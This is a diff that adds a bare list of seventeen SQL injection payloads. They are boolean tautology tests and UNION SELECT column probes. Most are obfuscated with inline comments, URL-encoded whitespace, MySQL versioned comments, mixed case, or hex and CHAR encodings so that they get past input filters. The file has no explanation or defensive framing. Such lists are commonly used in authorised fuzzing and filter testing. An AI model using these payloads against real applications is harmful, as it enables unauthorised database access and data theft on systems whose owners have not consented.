@@ -1,0 +1,17 @@
+'/**/AND/**/1=1-- -
+'%09AND%091=1-- -
+'%0aAND%0a1=1-- -
+'/*!50000AND*/1=1-- -
+' UnIoN SeLeCt 1,2,3-- -
+' UNION/**/SELECT/**/1,2,3-- -
+' UNION%0ASELECT%0A1,2,3-- -
+'+UNION+SELECT+1,2,3--+-
+'||(SELECT '1')||'
+' AND 1=1 AND '1'='1
+'/**/OR/**/'1'='1
+' %0bOR %0b'1'='1
+' AND 0x31=0x31-- -
+' AND CHAR(49)=CHAR(49)-- -
+' AND ASCII('A')=65-- -
+' UNION SELECT 1,2,3 FROM dual-- -
+' AND (SELECT 1)=(SELECT 1)-- -
